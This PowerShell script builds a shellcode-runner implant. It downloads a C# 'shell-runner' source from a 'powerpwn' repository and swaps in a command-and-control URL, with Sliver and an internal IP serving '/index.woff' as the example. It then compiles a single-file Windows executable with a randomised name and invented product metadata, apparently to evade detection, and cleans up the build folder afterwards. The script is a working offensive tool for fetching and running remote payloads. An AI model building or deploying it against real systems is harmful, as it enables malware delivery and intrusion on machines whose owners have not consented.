# Generate a random suffix and build a random assembly name
$randomSuffix = ([System.Guid]::NewGuid().ToString("N").Substring(0,8))
$randomName = "ShellRunner_$randomSuffix"

# Define the temporary project folder name
$projFolder = "ShellRunnerProj"

# If the project folder exists, remove it (including all contents)
if (Test-Path $projFolder) { 
    Remove-Item -Path $projFolder -Recurse -Force 
}

# Create a new project folder and switch into it
New-Item -ItemType Directory -Path $projFolder | Out-Null
Set-Location $projFolder

# Initialize a new console project in the current directory
dotnet new console --force

# Remove the default Program.cs (we’ll replace it with your downloaded code)
Remove-Item Program.cs -Force

# Download your C# source file and save it as Program.cs
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/paulkwalton/thescriptvault/refs/heads/main/powerpwn/shell-runner.cs" -OutFile "Program.cs"

# Prompt for a new URL and replace the hardcoded URL in Program.cs
$u = Read-Host "Enter new URL, an example for Sliver would be http://192.168.42.155:8080/index.woff"
(Get-Content "Program.cs" -Raw) -replace ([regex]::Escape("http://192.168.42.157/index.woff")), $u | Set-Content "Program.cs"

# Publish the project as a self-contained, single-file trimmed executable for Windows x64.
# Additional MSBuild properties are passed to change:
#  - The assembly (and output exe) name (using our random name)
#  - Imaginary file properties such as FileVersion, InformationalVersion, Product, Company, and Description
dotnet publish -c Release -r win-x64 --self-contained true `
    /p:PublishSingleFile=true `
    /p:PublishTrimmed=true `
    /p:PublishReadyToRun=false `
    /p:TrimMode=Link `
    /p:AssemblyName=$randomName `
    /p:FileVersion="1.0.0.0" `
    /p:InformationalVersion="Randomized ShellRunner" `
    /p:Product="ShellRunnerProduct" `
    /p:Company="ShellRunner Inc" `
    /p:FileDescription="This is an imaginary description for a random ShellRunner binary" `
    -o publish

# Define the desktop path and the path to the published exe (which uses the random name)
$desktop = [Environment]::GetFolderPath("Desktop")
$exePath = Join-Path -Path (Resolve-Path "./publish") -ChildPath ("$randomName.exe")

# Copy the published exe to the desktop
Copy-Item -Path $exePath -Destination (Join-Path -Path $desktop -ChildPath ("$randomName.exe"))

# Return to the parent directory and clean up by deleting the project folder
Set-Location ..
Remove-Item -Path $projFolder -Recurse -Force
